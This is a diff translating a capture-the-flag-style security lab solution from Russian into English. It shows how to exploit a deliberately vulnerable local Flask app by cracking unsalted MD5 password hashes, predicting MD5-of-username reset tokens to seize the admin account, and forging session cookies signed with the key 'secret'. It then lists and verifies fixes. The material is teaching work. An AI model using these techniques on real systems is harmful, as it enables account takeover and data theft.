@@ -1,21 +1,21 @@
-🌐 **Русский** · [Oʻzbekcha](./SOLUTION.uz.md)
+🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)
 
-# A04 — Решение (спойлеры!)
+# A04 — Solution (spoilers!)
 
-Сначала попробуйте пройти лабу сами, используя подсказки из [README](./README.md).
+Try the lab yourself first, using the hints from the [README](./README.md).
 
-## 1. Как хранятся данные (vulnerable, порт 8031)
+## 1. How the data is stored (vulnerable, port 8031)
 
 ```bash
 curl -s http://127.0.0.1:8031/_lab/dump > dump.json
 ```
 
-- `password_hash`: 32 hex-символа, то есть **MD5 без соли**
-- `cards.number`: полные номера карт **открытым текстом**
+- `password_hash`: 32 hex characters, which means **unsalted MD5**
+- `cards.number`: full card numbers in **plain text**
 
-## 2. Подбор паролей по словарю
+## 2. Guessing passwords with a dictionary
 
-MD5 считается мгновенно, а без соли одинаковые пароли дают одинаковые хеши, поэтому их можно сравнивать со словарём (запускать из папки лабы):
+MD5 is computed instantly, and without a salt identical passwords give identical hashes, so they can be compared against a dictionary (run it from the lab folder):
 
 ```bash
 python3 - <<'EOF'
@@ -31,32 +31,32 @@ EOF
 # bob   -> qwerty
 ```
 
-Пароль `admin` в словаре отсутствует, поэтому так его не подобрать. Но есть другие пути.
+The `admin` password is not in the dictionary, so it cannot be guessed this way. But there are other paths.
 
-## 3. Админ через предсказуемый токен сброса
+## 3. Admin through a predictable reset token
 
 ```bash
-# Запрашиваем сброс для себя и смотрим «письмо»
+# Request a reset for yourself and look at the "email"
 curl -H 'Content-Type: application/json' -d '{"username":"alice"}' http://127.0.0.1:8031/reset-request
 curl http://127.0.0.1:8031/_lab/outbox
-# ссылка вида /reset/<32 hex-символа>
+# a link like /reset/<32 hex characters>
 
-# Сравниваем токен с MD5 от имени
-echo -n alice | md5sum        # совпадает с токеном
+# Compare the token with the MD5 of the name
+echo -n alice | md5sum        # matches the token
 
-# Значит, токен админа вычисляется так же
+# So the admin's token is computed the same way
 TOKEN=$(echo -n admin | md5sum | cut -d' ' -f1)
 curl -H 'Content-Type: application/json' -d '{"new_password":"hacked123"}' http://127.0.0.1:8031/reset/$TOKEN
 
-# Входим админом и смотрим флаг
+# Log in as admin and look at the flag
 curl -c jar.txt -H 'Content-Type: application/json' \
   -d '{"username":"admin","password":"hacked123"}' http://127.0.0.1:8031/login
 curl -b jar.txt http://127.0.0.1:8031/me     # FLAG{a04_admin_takeover}
 ```
 
-## 4. Админ через подделку cookie
+## 4. Admin through a forged cookie
 
-Ключ подписи сессии в коде равен `secret`, а такие слабые ключи подбираются по словарю. Зная ключ, можно подписать любую сессию:
+The session signing key in the code is `secret`, and such weak keys can be guessed with a dictionary. Knowing the key, you can sign any session:
 
 ```bash
 pip install Flask
@@ -68,35 +68,35 @@ app.secret_key = "secret"
 print(SecureCookieSessionInterface().get_signing_serializer(app).dumps({"user": "admin"}))
 EOF
 
-curl --cookie "session=<значение из вывода>" http://127.0.0.1:8031/me   # FLAG{a04_admin_takeover}
+curl --cookie "session=<value from the output>" http://127.0.0.1:8031/me   # FLAG{a04_admin_takeover}
 ```
 
-## 5. Номера карт
+## 5. Card numbers
 
-`GET /cards` для вошедшего пользователя возвращает полный номер карты, а в «утёкшей» базе он лежит открытым текстом.
+`GET /cards` returns the full card number to a logged-in user, and in the "leaked" database it is stored in plain text.
 
-## Исправления (fixed, порт 8032)
+## Fixes (fixed, port 8032)
 
-| Проблема | Исправление |
-|----------|-------------|
-| MD5 без соли | `generate_password_hash` (scrypt с уникальной солью) |
-| Токен = MD5(имя) | `secrets.token_urlsafe(32)`, в базе только SHA-256 от токена, срок жизни 15 минут, одноразовый |
-| Ключ сессии `secret` | Ключ из `SECRET_KEY` или случайный (`secrets.token_hex(32)`), cookie с `HttpOnly` и `SameSite` |
-| Карты открытым текстом | Шифрование Fernet (AES) перед записью, ключ из `DATA_ENCRYPTION_KEY`; в ответе только маска `**** **** **** 1111` |
-| Слабые пароли при регистрации | Минимальная длина 8 символов |
+| Problem | Fix |
+|---------|-----|
+| Unsalted MD5 | `generate_password_hash` (scrypt with a unique salt) |
+| Token = MD5(name) | `secrets.token_urlsafe(32)`, only the SHA-256 of the token is stored, 15-minute lifetime, single-use |
+| Session key `secret` | The key comes from `SECRET_KEY` or is random (`secrets.token_hex(32)`), the cookie has `HttpOnly` and `SameSite` |
+| Cards in plain text | Fernet (AES) encryption before writing, the key comes from `DATA_ENCRYPTION_KEY`; the response contains only the mask `**** **** **** 1111` |
+| Weak passwords at registration | Minimum length of 8 characters |
 
-Проверка на fixed:
+Check on fixed:
 
 ```bash
-curl -s http://127.0.0.1:8032/_lab/dump      # хеши scrypt:..., карты в виде gAAAA...
-# предсказанный токен админа отвергается
+curl -s http://127.0.0.1:8032/_lab/dump      # scrypt:... hashes, cards as gAAAA...
+# the predicted admin token is rejected
 curl -H 'Content-Type: application/json' -d '{"new_password":"hacked12345"}' \
   http://127.0.0.1:8032/reset/$(echo -n admin | md5sum | cut -d' ' -f1)      # 400
 ```
 
-Подделанная cookie с ключом `secret` не принимается: подпись не совпадает.
+A forged cookie signed with the key `secret` is not accepted: the signature does not match.
 
-## Что ещё стоит помнить
-- Шифрование без защиты ключа бессмысленно: ключ нужно хранить отдельно от данных (менеджер секретов, переменные окружения).
-- В лабе ключи при отсутствии переменных окружения создаются заново при каждом запуске. Для реальной системы это неприемлемо: после перезапуска старые данные нельзя было бы расшифровать.
-- В `/_lab/dump` и `/_lab/outbox` нет защиты: это учебная имитация. В реальных приложениях таких эндпоинтов быть не должно.
+## What else to remember
+- Encryption without protecting the key is pointless: the key must be stored separately from the data (a secrets manager, environment variables).
+- In the lab, if the environment variables are missing, the keys are created anew on every start. That is unacceptable for a real system: after a restart the old data could not be decrypted.
+- `/_lab/dump` and `/_lab/outbox` are not protected: this is a learning imitation. Real applications must not have such endpoints.
